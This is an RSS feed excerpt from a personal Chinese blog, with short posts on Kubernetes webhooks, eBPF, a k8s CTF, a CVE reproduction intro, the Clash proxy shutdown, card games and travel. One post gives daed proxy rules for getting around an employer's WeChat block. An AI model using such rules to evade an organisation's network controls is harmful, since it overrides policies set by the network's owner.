&lt;blockquote&gt;
&lt;p&gt;自信心会给工作过程带来快乐, 让人表现更好&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对于人类的表现和福祉而言, 重要的不只是我们的能力, 而使我们对自身能力的感受&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;自信并非与生俱来, 而使透过学习获得&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你说的话往往会成为你相信的真理, 当你听到&amp;quot;你能办到&amp;quot;, &amp;ldquo;就快成功了&amp;quot;等微小鼓励, 就足以对自信水平发生影响, 更重要的是, 自己可以向自己传达正面讯息.&lt;/p&gt;</description>
    </item>
    <item>
      <title>特殊网络环境下的微信代理</title>
      <link>https://dragonbox.top/posts/tech-wechat-proxy/</link>
      <pubDate>Wed, 02 Oct 2024 09:33:06 +0800</pubDate>
      <guid>https://dragonbox.top/posts/tech-wechat-proxy/</guid>
      <description>&lt;p&gt;目前单位实施了微信封锁,本文旨在记录绕过封锁的过程.&lt;/p&gt;
&lt;h2 id=&#34;阶段一-抓域名&#34;&gt;阶段一: 抓域名&lt;/h2&gt;
&lt;p&gt;使用了&lt;code&gt;tcpdump&lt;/code&gt;抓取各个dns请求, 来获取需要代理的域名列表&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo tcpdump -i any -n -s &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; port &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是抓到域名后加入daed的代理列表中还是无法登陆,怀疑是没抓全.&lt;/p&gt;
&lt;h2 id=&#34;阶段二-进程代理&#34;&gt;阶段二: 进程代理&lt;/h2&gt;
&lt;p&gt;既然抓不全, 那么就对整个微信的进程进行流量代理吧, 在daed中添加规则:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pname(WeChatAppEx) -&amp;gt; proxy
pname(wechat) -&amp;gt; proxy
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这下登陆和发文字消息都正常了, 但是图片的发送和接收有极其严重的延迟, 应该是走了代理导致的.&lt;/p&gt;
&lt;h2 id=&#34;阶段三-仅代理登陆相关域名&#34;&gt;阶段三: 仅代理登陆相关域名&lt;/h2&gt;
&lt;p&gt;经过几次实验, 发送单位对微信的封禁主要有两方面:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;登陆相关的流量封禁&lt;/li&gt;
&lt;li&gt;微信公众号图片相关的流量封禁&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么在搜索到&lt;a href=&#34;https://www.fdeer.com/4817.html&#34;&gt;相关域名列表&lt;/a&gt;之后,将对应的域名添加到daed规则中,其他的流量不作处理使用直连.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;domain(keyword:login.weixin,keyword:open.weixin,keyword:mp.weixin,keyword:qpic) -&amp;gt; proxy
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重新加载规则, 一切正常.&lt;/p&gt;</description>
    </item>
    <item>
      <title>卡牌迷思：从万智牌的衰退开始</title>
      <link>https://dragonbox.top/posts/gossip-tcg/</link>
      <pubDate>Sat, 28 Sep 2024 13:11:48 +0800</pubDate>
      <guid>https://dragonbox.top/posts/gossip-tcg/</guid>
      <description>&lt;p&gt;这几天被万智牌所吸引, 富有史诗感的画风, 复杂但不混乱的规则, 简洁的卡面语言, 丰富的卡片种类, 多样性的玩法&amp;hellip;&amp;hellip;这些都是我在游戏王中所接触不到但怀念许久的, 在接触万智牌之前,这种怀念源自于过去的炉石传说,而在了解到万智牌后才发现,这些特质其实是万智牌所创造而让炉石继承下来的, 再加上略倾向于黑暗史诗的画风, 万智牌在很多维度上都比过去接触过的所有卡牌游戏更戳我的xp.&lt;/p&gt;
&lt;p&gt;当然, 它并不是没有缺点的, 虽然主要的几个缺点都不是卡牌本身带来的.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最大的缺点其实在于威世智的运营太垃圾了
&lt;ul&gt;
&lt;li&gt;缺乏推广, 国内的推广力度相比较宝可梦来说几乎为0, 我目前能看到的最近的一次推广还是在2021年, 找的甚至还是半佛而不是正儿八经的明星&lt;/li&gt;
&lt;li&gt;官方对民间赛事的抵制态度让&amp;quot;积极组织-&amp;gt;积极阻止&amp;quot;成为大陆万智牌玩家口口相传的黑历史, 失去了民心&lt;/li&gt;
&lt;li&gt;取消中文线不仅妨碍的新人入坑, 也让老玩家对买卡的投资价值产生了怀疑, 继而推动这两类人去投资其他发展更有前景的卡牌&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;万智牌的定价, 四美元十五抽的全球统一定价在三十年的万智牌历史中就没有变过, 可即便在消费水平远胜过去的现在, 这个价格在大部分人, 尤其是圈外玩家看来依旧偏高, 再加上至少60牌的构筑体量和二级市场交易, 让成型万智套牌的价格普遍在500+, 与之形成鲜明对比的, 是宝可梦和游戏王等TCG后辈们更加亲民的价格, 让万智牌显得像是一个跟不上时代的老人. 当然了, 就我个人而言, 万智牌的设计感值得让它的价格比别的卡牌贵, 虽然我不会买&lt;/li&gt;
&lt;li&gt;背景故事质量不高. 人类是一个以讲故事起家的物种, 人类社会也是在金钱政治国家宗教等种种抽象故事基础上建立起来的, 可以说没有故事就没有社群. 万智牌不是没有故事, 而是它的故事太过单薄且没有吸引人的地方, 在这个故事遍地走的年代, 随便一本主流的冒险小说都可以拉出来吊打它, 而不够精彩的故事就注定无法吸引注重故事的人&lt;/li&gt;
&lt;li&gt;缺乏故事的传播媒介. 客观来说, 游戏王和宝可梦的背景故事放在现在来看同样水平一般, 假如大家的故事形式都只是小说, 我相信万智牌在讲故事这方面或许还有一战之力, 但是游戏王和宝可梦有了动画, 竞争的维度就变得不一样了, 在处理得当的情况下, 视频影像会大幅度提高一个故事情感渲染的上下限, 即便剧情再怎么糟糕, 人们也会因为那么几个印象深刻的画面而记住这个IP, 随着时间的推移, 动画带来的传播效应会呈现滚雪球式的增加: 老玩家会因为获得滤镜加持, 新玩家同样可以轻松因为画面而发生共情.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;剩下的涉及卡牌平衡性的缺点, 这也引发了我对众多TCG游戏的思考, 包括游戏整体的生命周期以及TCG游戏的意义.&lt;/p&gt;
&lt;h2 id=&#34;生命周期&#34;&gt;生命周期&lt;/h2&gt;
&lt;h3 id=&#34;实体苦厄&#34;&gt;实体苦厄&lt;/h3&gt;
&lt;p&gt;纵观众多TCG, 万智牌受限于底层费用机制似乎在这方面相对来说做得好一些, 然而问题在于, 作为一个商业产品, 它的第一任务是给公司带来财富, 第二任务才是服务于玩家, 尽管二者在有些时候, 尤其是游戏发展的早期是不冲突的. 从玩家来说, &lt;strong&gt;游戏本体的运营发展存在两个方向, 一是玩法的扩张, 二是强度的迭代&lt;/strong&gt;, 前者更灵巧更得人心, 后者则由于对已有卡牌的淘汰而常常备受争议. 一般来说, 有经验的卡牌运营商并不着急于强度迭代, 而是优先致力于玩法的扩张, 间或夹杂必要的强度提升, 可惜的是, 近乎固化的底层规则框架决定了玩法的扩张是有边际效应的, &lt;strong&gt;当扩张玩法的边际效应变得越来越低时, 说明TCG的生命周期已经步入了后半段&lt;/strong&gt;, 然而这与商业产品的第一使命相互冲突, 随之而来的是强度的无限扩张和争议的发生, 在没有新玩法的情况下, 可以预见的是无止境的强度爆炸. 在这点上, 所有商业TCG都面临着同样的问题: 有限的卡牌玩法和无限的公司贪欲与玩家需求引发的主要矛盾.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kubernetes Admission Webhook 部署和调试</title>
      <link>https://dragonbox.top/posts/tech-kubernetes-webhook/</link>
      <pubDate>Fri, 03 May 2024 17:14:14 +0800</pubDate>
      <guid>https://dragonbox.top/posts/tech-kubernetes-webhook/</guid>
      <description>&lt;h1 id=&#34;deployment-and-debugging-of-admission-webhook-in-kubernetes-cluster&#34;&gt;Deployment and Debugging of Admission Webhook in Kubernetes cluster&lt;/h1&gt;
&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;uhttps://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllersrl&#34;&gt;Dynamic admission control&lt;/a&gt; 允许开发者添加自己的逻辑代码来对提交给API Server的对象进行修改和验证, 是非常强大的功能. 本文将部署一组demo admission webhook, 包括一个validating webhook 和一个 mutating webhook, 并介绍webhook的调试方法. 本文主要使用和参考了&lt;a href=&#34;https://zhuanlan.zhihu.com/p/404764407&#34;&gt;从0到1开发K8S_Webhook最佳实践&lt;/a&gt;, 并通过查阅官方文档对其中的一些不适应新版本k8s的内容进行了修正.&lt;/p&gt;
&lt;p&gt;本文使用的集群环境为Kubernetes v1.25.16, 使用minikube创建. 我所在的机器为Arch Linux. 代码仓库为 &lt;a href=&#34;https://github.com/scriptwang/admission-webhook-example&#34;&gt;admission-webhook-example&lt;/a&gt;中的v1部分.&lt;/p&gt;
&lt;p&gt;在开始之前, 请确保集群的API Server开启了MutatingAdmissionWebhook和ValidatingAdmissionWebhook (一般默认情况下都开启了).&lt;/p&gt;
&lt;h2 id=&#34;deployment&#34;&gt;Deployment&lt;/h2&gt;
&lt;h3 id=&#34;创建-service-account&#34;&gt;创建 service account&lt;/h3&gt;
&lt;p&gt;创建一个用于webhook的service account&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f deployment/rbac.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;创建证书&#34;&gt;创建证书&lt;/h3&gt;
&lt;p&gt;API Server调用Webhook的过程是需要HTTPS通信的(其实集群内的通信几乎都是HTTPS), 因此需要为webhook创建证书来对webhook的service进行域名认证. &lt;strong&gt;原博客使用的webhook-create-signed-cert.sh已经过时, 不再适用于1.25.16版本的集群了&lt;/strong&gt;, 主要出问题的地方如下:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# create  server cert/key CSR and  send to k8s API&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt;EOF | kubectl create -f -
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;apiVersion: certificates.k8s.io/v1beta1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;kind: CertificateSigningRequest
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  name: ${csrName}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;spec:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  groups:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - system:authenticated
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  request: $(cat ${tmpdir}/server.csr | base64 | tr -d &amp;#39;\n&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  usages:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - digital signature
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - key encipherment
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - server auth
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据文档, 在1.22以及之后版本的kubernetes中, &lt;code&gt;certificates.k8s.io/v1beta1&lt;/code&gt; 已经被抛弃不可用, 需要修改为&lt;code&gt;certificates.k8s.io/v1&lt;/code&gt;, 并且需要在&lt;code&gt;spec&lt;/code&gt;中增加&lt;code&gt;signerName&lt;/code&gt;, signer的作用是签署证书. k8s内置的&lt;code&gt;signerName&lt;/code&gt; 有以下几种:&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-26484 Kubevirt 权限提升漏洞复现</title>
      <link>https://dragonbox.top/posts/sec-cve-2023-26484/</link>
      <pubDate>Tue, 30 Apr 2024 20:29:05 +0800</pubDate>
      <guid>https://dragonbox.top/posts/sec-cve-2023-26484/</guid>
      <description>&lt;p&gt;该漏洞是论文工作 &amp;ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications&amp;rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.&lt;/p&gt;</description>
    </item>
    <item>
      <title>若为自由故, 软件皆可抛</title>
      <link>https://dragonbox.top/posts/read-free-opensource/</link>
      <pubDate>Sat, 23 Mar 2024 22:57:50 +0000</pubDate>
      <guid>https://dragonbox.top/posts/read-free-opensource/</guid>
      <description>&lt;p&gt;借着&amp;quot;若为自由故&amp;quot;这本书, 读者可以更深刻地理解开源软件与自由软件的异同之处. 由于在实际情况中, 二者都开放了源代码, 大部分情况下也都会采用互相兼容甚至相同的协议, 因此其中的区别在越来越多人眼里逐渐模糊. 如今的软件行业, 大多数人在表达相同意思时更加倾向于使用&amp;quot;Open-source&amp;quot;而不是&amp;quot;Free&amp;quot;这个词, 不仅能够直观清晰地表达信息, 也能避免&amp;quot;Free&amp;quot;这个单词常用的&amp;quot;免费&amp;quot;之意 (为了人们认识到&amp;quot;Free software&amp;quot;中的Free不是免费而是自由的意思, Stallman 可强调了许多次, 但很遗憾, 大部分公司在听到他的强调前就会被吓跑). 但只要了解过自由软件和开源软件的历史, 就能发现其中差距并不在技术而是在道德层面上的分歧.&lt;/p&gt;
&lt;p&gt;具体来说, 开源运动更加注重软件开发方式的开放性, 一种类似于集市场景中人人可参与的, 以软件质量为最终目标的倡议, 它关注的是软件本身, 因此颇具工程师的纯粹特性; 相反, 自由软件运动不仅仅注重软件开发方式, 更赋予软件本身以道德属性, 它更强调软件用户的自由修改和自由传播的权利, 以&amp;quot;人的自由&amp;quot;为中心, 任何限制软件用户这些权利的个人和组织都是&amp;quot;邪恶&amp;quot;且需要被抵制的, 这让它更像是一种社会运动. 有一句Stallman的话可以很好地阐释其意: &amp;ldquo;如果一个软件是不自由的, 哪怕它的技术非常先进, 我也不会去使用它&amp;rdquo;, 相反, 开源运动的代表人物Linus曾经在一次大会上公开表示自己是Microsoft Powerpoint的粉丝用户, 二者的冲突也由此而来: 在开源主义者眼中, 商业软件是一个不完美的解决方案, 但是在自由软件者眼中, 商业软件则是彻头彻尾的敌人.&lt;/p&gt;
&lt;p&gt;两种运动并不是互相独立的, 相反, 开源运动脱胎于自由软件运动, 是后者为了适应软件行业商业发展的一种必然演变, 也是追求自由的理想主义者在现实屡屡碰壁后的一种妥协.&lt;/p&gt;
&lt;p&gt;在今天, 尽管Stallman依旧在全球各地对着众多慕名而来的听众布道, 他也依旧能给人以震撼人心开悟明智的感觉, 但这种感觉过后又有谁会真的去追随他的步伐, 去将自己生活中的所有专有软件清除呢? 要知道, Stallman的攻击目标, 可不仅仅是个人计算机中的专有软件, 任何非自由软件, 不管是汽车上的, 飞机上的, 动车上的, 乃至收音机里的, 都是他的抵制对象. 而对于没有资源的普通人来说, 单是找一台彻头彻尾源码可见(指主板上的固件)的笔记本电脑, 就已经是一件非常困难且完全没有性价比的事情了.&lt;/p&gt;
&lt;p&gt;从我的角度来看, 虽然很遗憾, 但是自开源运动成长起来后, 自由软件存在的意义就没有以前那么大了, 甚至说的不客气一些, 微乎其微. 这是需要联系历史背景来看的, 在自由软件运动诞生的那个年代, 软件行业极度闭塞, 互联网才刚刚诞生, 各个公司都在自己蒙头闭门造车, 极尽所能保护自家的代码不被公开, 相互之间更不用说有什么兼容合作了. 自由软件的诞生是对那个封闭环境的一种彻头彻尾的反叛, 它以一种偏激的姿态在软件行业逐渐打动了一批人, 也培养起了别具一格更加开放的文化.&lt;/p&gt;</description>
    </item>
    <item>
      <title>k8s lan party</title>
      <link>https://dragonbox.top/posts/ctf-k8s-lan-party/</link>
      <pubDate>Fri, 15 Mar 2024 07:34:46 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-k8s-lan-party/</guid>
      <description>&lt;p&gt;Long time no CTF~~&lt;/p&gt;
&lt;h2 id=&#34;recon&#34;&gt;RECON&lt;/h2&gt;
&lt;p&gt;Just check the environment related to K8s using &lt;code&gt;env&lt;/code&gt; and reconnoiter internal service using &lt;code&gt;dnscan&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;recon.png&#34; alt=&#34;recon&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;This blog is good written &lt;a href=&#34;https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;finding-neighbours&#34;&gt;Finding Neighbours&lt;/h2&gt;
&lt;p&gt;According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to &lt;code&gt;reporting-service.k8s-lan-party.svc.cluster.local&lt;/code&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>2023年度总结</title>
      <link>https://dragonbox.top/posts/gossip-2023-summary/</link>
      <pubDate>Fri, 09 Feb 2024 22:31:25 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-2023-summary/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;一事无成的一年, 但也算有所收获, 如果教训也算收获的话.&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>Learning eBPF</title>
      <link>https://dragonbox.top/posts/tech-learning-ebpf/</link>
      <pubDate>Sun, 04 Feb 2024 00:06:15 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-learning-ebpf/</guid>
      <description>&lt;p&gt;eBPF 是一项革命性的技术, 起源于Linux 内核, 它可以在特权上下文中(如操作系统内核)运行沙盒程序. 它用于安全有效地扩展内核的功能, 而无需通过更改内核源代码或加载内核模块的方式来实现. 从历史上看,由于内核具有监督和控制整个系统的特权,操作系统一直是实现可观测性, 安全性和网络功能的理想场所.&lt;/p&gt;
&lt;p&gt;对ebpf慕名许久, 正好趁寒假拜读一下Learning eBPF, 虽然是基于略过时的框架bcc, 但是在这个过程中学到的知识想必依旧可以迁移到别的框架去.&lt;/p&gt;
&lt;h2 id=&#34;background-and-pre-knowledge&#34;&gt;Background and pre-knowledge&lt;/h2&gt;
&lt;h3 id=&#34;bcc&#34;&gt;bcc&lt;/h3&gt;
&lt;p&gt;bcc的ebpf c代码不是真正的C, 而是bcc自己定义的一种和C类似的语言.&lt;/p&gt;
&lt;h3 id=&#34;limitation-of-ebpf-program&#34;&gt;limitation of ebpf program&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;eBPF 程序必须被验证器校验通过后才能执行，且不能包含无法到达的指令；&lt;/li&gt;
&lt;li&gt;eBPF 程序不能随意调用内核函数，只能调用在 API 中定义的辅助函数；&lt;/li&gt;
&lt;li&gt;eBPF 程序栈空间最多只有 512 字节，想要更大的存储，就必须要借助映射存储；&lt;/li&gt;
&lt;li&gt;在内核 5.2 之前，eBPF 字节码最多只支持 4096 条指令，而 5.2 内核把这个限制提高到了 100 万条；&lt;/li&gt;
&lt;li&gt;由于内核的快速变化，在不同版本内核中运行时，需要访问内核数据结构的 eBPF 程序很可能需要调整源码，并重新编译。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tracepoint-and-kprobe&#34;&gt;tracepoint and kprobe&lt;/h3&gt;
&lt;p&gt;tracepoint其实就是在Linux内核的一些关键函数中埋下的hook点,这样在tracing的时候,我们就可以在这些固定的点上挂载调试的函数,然后查看内核的信息.&lt;/p&gt;
&lt;p&gt;Tracepoint是在内核中固定的hook点, 并不是在所有的函数中都有tracepoint. 这时候, 我们就需要用到kprobe了. kprobe可以动态地在所有的内核函数(除了inline函数)上挂载probe函数&lt;/p&gt;
&lt;h3 id=&#34;ebpf-virtual-machine&#34;&gt;eBPF virtual machine&lt;/h3&gt;
&lt;p&gt;The ebpf virtual machine uses 10 general-purpose registers (0-9), and additional register 10 which was used as a stack frame pointer (can only be read but not written). As a BPF program is executed, &lt;strong&gt;values get stored in these registers to keep track of state.&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>RIP Clash</title>
      <link>https://dragonbox.top/posts/gossip-rip-clash/</link>
      <pubDate>Sat, 04 Nov 2023 10:13:59 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-rip-clash/</guid>
      <description>&lt;p&gt;2023年11初,简中互联网又发生了一出闹剧,不过于以往的过眼云烟所不同的是,这次的事件导致了一系列优秀开源软件的消亡.&lt;/p&gt;
&lt;h2 id=&#34;起因&#34;&gt;起因&lt;/h2&gt;
&lt;p&gt;事件的经过其实并不复杂.11.2,clash for windows 的作者删除了github上用于发布的仓库中的信息,并在个人telegram频道上宣布不再开发.由于cfw的操作简单,对小白友好,因此其用户数量相当之大.删库的消息出来后,网友们纷纷开始关注作者的社交账号,对是否因信息泄露导致被抓加以猜测.其实对于一个网络代理软件来说,无论是因为被请喝茶还是因为作者不想干了而删库都是一件很正常的事情.&lt;/p&gt;
&lt;p&gt;如果事情仅仅到这里就结束,那么大家顶多也就感慨一句过去说烂了的那些话,甚至对于开源主义者来说连感慨都没有,因为cfw本身就是一个闭源软件,而github仅仅是用来发布二进制包的.&lt;/p&gt;
&lt;p&gt;但是事情没有那么简单.&lt;/p&gt;
&lt;p&gt;clash for windows是基于开源的clash core核心代码做的图形化客户端工具,而该核心代码同样是一系列类似软件（例如clash x, clash meta）的基础组件.或许是出于对clash core作者的尊重,这些项目的名称中也都包含了clash字样.&lt;/p&gt;
&lt;p&gt;通常情况下,开发者并不会在意自己的软件被普通用户和其他clash相关软件搞混.而对于cfw用户,尤其是其中的小白用户来说,他们中的大部分仅仅接触过cfw,因此在口口相传中会自然而然地将clash这个有特征的词作为clash for windows的指代以节约沟通成本,cfw是clash, clash是cfw.&lt;/p&gt;
&lt;p&gt;因此,cfw被删库后,消息通过互联网在用户群体之间开始广泛传播开来,很快就演变为了下面这张图上的消息.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;photo_2023-11-04_10-17-56.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;假消息只是第一步.对于大部分cfw的用户来说,他们似乎并不知道此种软件的敏感程度和软件作者所面临的风险,他们只是在盲目地在各大社交媒体上发问,而很遗憾却也意料之中的,这其中,包括了微博.&lt;/p&gt;
&lt;p&gt;前面提到,cfw的低门槛为它带来了众多的用户,而现在,这些用户将成为压死所有clash相关项目的稻草.由于提问和吃瓜的人太多,相关话题的热度不断上升,该话题很快出现在了微博的热搜上.&lt;/p&gt;
&lt;p&gt;于是事情失控了.&lt;/p&gt;
&lt;h2 id=&#34;结果&#34;&gt;结果&lt;/h2&gt;
&lt;p&gt;11月3号,出于对自身安全的考虑,几乎所有clash相关软件作者,包括clash内核项目作者,集体将代码库删除.一个持续了数年,帮助到许多网民的软件,却因为网民们的无知,在一天之间内尽数消亡.整个过程实在太快,快得根本不像有关部门的有组织行动.因为驱使项目消亡的,仅仅只是网民们的狂欢,和开源作者们的恐惧.&lt;/p&gt;
&lt;p&gt;而可悲的是,在删库时间结束后,clash在微博的话题热度更高了,是的,没有人关心项目作者是否会因为这场风波而被捕入狱,他们只想四处打听,吃瓜,并迫切地希望看到血流成河. 一直到现在, 有关话题在telegram上还在被持续不断的争论中, 其中跳出了一些人来试图通过捏造事实抹黑多位作者来洗脱自身的责任.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;normal.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可笑的是,当被要求放出对应的项目时,此人开始转移话题,并且在他臆想的情况下,对作者进行了人身攻击.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;attack.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可悲的是,这种人在这场风波中并不少见,他们不仅仅是无知,更是无耻.&lt;/p&gt;
&lt;h2 id=&#34;教训&#34;&gt;教训&lt;/h2&gt;
&lt;p&gt;其实单纯责怪用户并没有什么意义,毕竟像cfw这样方便的软件,其用户群体是鱼龙混杂的,要求他们集体提升相关的意识也是不现实的,所以很遗憾,尽管我们可以斥责部分的微博用户,但是归根到底,如何改变此类软件尤其是开源软件的危险现状,作者该做出什么样的改变来更好地保护自己,才是更有现实意义的话题.&lt;/p&gt;
&lt;p&gt;具体来说, 对我而言, 除非开源软件合法合规,否则:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;不要做windows平台下的软件&lt;/li&gt;
&lt;li&gt;不要在项目中包含简体中文说明&lt;/li&gt;
&lt;li&gt;不要取朗朗上口好记的项目名&lt;/li&gt;
&lt;li&gt;控制推广范围,就是对作者最大的保护&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;尽管以上措施会限制软件的使用范围,但是对于此类软件来说,开发者的人身安全才是第一位的.&lt;/p&gt;
&lt;p&gt;只是,这些教训,对于已经消亡的项目来说,已经太迟了.&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/net4people/bbs/issues/303&#34;&gt;https://github.com/net4people/bbs/issues/303&lt;/a&gt;
&lt;a href=&#34;https://www.eaimty.com/2023/opensource-project-based-on-hormone/&#34;&gt;https://www.eaimty.com/2023/opensource-project-based-on-hormone/&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>2023 记北京秋游</title>
      <link>https://dragonbox.top/posts/gossip-beijing-travel-2023-2/</link>
      <pubDate>Mon, 30 Oct 2023 21:35:04 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-beijing-travel-2023-2/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;与所爱之人在一起的时光, 会生出互相的珍惜, 这份珍惜犹如风筝线一般, 即便对方远在云端, 依旧可以感知到其心念所动, 于是思念由此而生.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在yq成功上岸家乡的教师编后, 为了庆祝, 也为了缓解许久未见的相思之苦, 我匆忙计划了一下行程, 一边让她订来北京的车票,  一边思考附近哪里有卖香槟的.&lt;/p&gt;
&lt;h2 id=&#34;颐和园&#34;&gt;颐和园&lt;/h2&gt;
&lt;p&gt;选择颐和园, 是因为离信工所比较近. 当日原本想带yq去我平时去的早餐店, 可惜我们出发之时, 已是中午十二点了, 于是带她吃之前推荐过的意大利沙县萨莉亚. 这是一个价格非常亲民的意大利西餐厅, 看了看菜单上十几二十元的菜品后, 我们彻底放下了对价格的顾虑, 仅仅考虑口味和胃口. 实际上这家店的口味确实不错, 特别是蘑菇浓汤, 虽然肯定不能说顶级, 但这种不用顾虑价格就享受西餐的轻松感, 独此一份 (说白了还是太穷).&lt;/p&gt;
